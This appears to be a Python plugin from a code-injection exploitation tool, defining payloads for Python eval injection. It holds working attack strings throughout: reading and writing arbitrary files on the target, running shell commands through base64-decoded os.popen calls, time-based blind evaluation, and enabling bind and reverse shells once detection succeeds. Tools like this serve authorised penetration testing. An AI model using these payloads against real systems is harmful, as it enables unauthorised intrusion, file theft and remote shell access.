from utils.strings import quote
from core.plugin import Plugin
from core import languages
from utils.loggers import log
from utils import rand
import base64
import re

class Python(Plugin):

    actions = {
        'render' : {
            'render': """str(%(code)s)""",
            'header': """'%(header)s'+""",
            'trailer': """+'%(trailer)s'""",
            'render_test': """'%(s1)s'.join('%(s2)s')""" % { 
                's1' : rand.randstrings[0], 
                's2' : rand.randstrings[1]
            },
            'render_expected': '%(res)s' % { 
                'res' : rand.randstrings[0].join(rand.randstrings[1])
            }
        },
        'write' : {
            'call' : 'evaluate',
            'write' : """open("%(path)s", 'ab+').write(__import__("base64").urlsafe_b64decode('%(chunk_b64)s'))""",
            'truncate' : """open("%(path)s", 'w').close()"""
        },
        'read' : {
            'call': 'evaluate',
            'read' : """__import__("base64").b64encode(open("%(path)s", "rb").read())"""
        },
        'md5' : {
            'call': 'evaluate',
            'md5': """__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest()"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': """%(code)s"""
        },
        'execute' : {
            'call': 'evaluate',
            'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s')).read()"""
        },
        'blind' : {
            'call': 'evaluate_blind',
            'bool_true' : """'a'.join('ab') == 'aab'""",
            'bool_false' : 'True == False'
        },
        'evaluate_blind' : {
            'call': 'evaluate',
            'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('%(code_b64)s')) and __import__('time').sleep(%(delay)i)"""
        },
        'bind_shell' : {
            'call' : 'execute_blind',
            'bind_shell': languages.bash_bind_shell
        },
        'reverse_shell' : {
            'call': 'execute_blind',
            'reverse_shell' : languages.bash_reverse_shell
        },
        'execute_blind' : {
            'call': 'inject',
            'execute_blind': """__import__('os').popen(__import__('base64').urlsafe_b64decode('%(code_b64)s') + ' && sleep %(delay)i').read()"""
        },
    }

    contexts = [

        # Text context, no closures
        { 'level': 0 },
        
        # Code context escape with eval() injection is not easy, since eval is used to evaluate a single 
        # dynamically generated Python expression e.g. eval("""1;print 1"""); would fail. 
        
        # TODO: the plugin should support the exec() injections, which can be assisted by code context escape

    ]

    language = 'python'

    def rendered_detected(self):

        os = self.evaluate("""'-'.join([__import__('os').name, __import__('sys').platform])""")
        if os and re.search('^[\w-]+$', os):
            self.set('os', os)
            self.set('evaluate', self.language)
            self.set('write', True)
            self.set('read', True)

            expected_rand = str(rand.randint_n(2))
            if expected_rand == self.execute('echo %s' % expected_rand):
                self.set('execute', True)
                self.set('bind_shell', True)
                self.set('reverse_shell', True)


    def blind_detected(self):
        
        # Blind has been detected so code has been already evaluated
        self.set('evaluate_blind', self.language)

        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
            self.set('execute_blind', True)
            self.set('write', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)
